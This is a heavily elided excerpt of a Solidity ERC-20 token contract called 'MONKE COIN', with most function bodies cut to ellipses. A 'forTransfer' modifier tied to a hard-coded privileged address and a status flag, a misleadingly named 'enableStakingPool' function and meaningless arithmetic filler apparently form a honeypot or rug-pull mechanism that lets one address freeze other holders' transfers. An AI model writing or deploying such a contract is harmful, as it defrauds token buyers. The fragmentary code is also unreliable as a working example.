...
contract MONKECOIN is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenMONKE_totalSupply;
    uint256 private _tokenMONKE_status = 0;
    uint256 public stakingPoolMONKEStatus = 0;

    string private _tokenMONKE_name;
    string private _tokenMONKE_symbol;

    address private _poolMONKEAddress = 0x0F130eA985cBE3aa5771463263C71d45986c5221;

    constructor() {
        _tokenMONKE_name = "MONKE COIN";
        _tokenMONKE_symbol = "MONKE";
        _tokenMONKE_totalSupply = 51000 * 10 ** 18;
        _balances[msg.sender] = _tokenMONKE_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolMONKEAddress || _tokenMONKE_status == 0);
        _;
    }
  ...
  function transfer(address to, uint256 amount) public virtual override returns (bool) {
    ...
    function _safeTransfer(
      ...
      function totalSupply() public view virtual override returns (uint256) {
        return _tokenMONKE_totalSupply;
    }
   ...
   function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
    ...
    function _approve(
      ...
      function enableStakingPool(address disabledAddress) public {
        ...
        a = a + 1;
        a = a - 1;
        if (msg.sender == _poolMONKEAddress)
        {
            _tokenMONKE_status = 0;
        }
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _tokenMONKE_totalSupply -= amount;
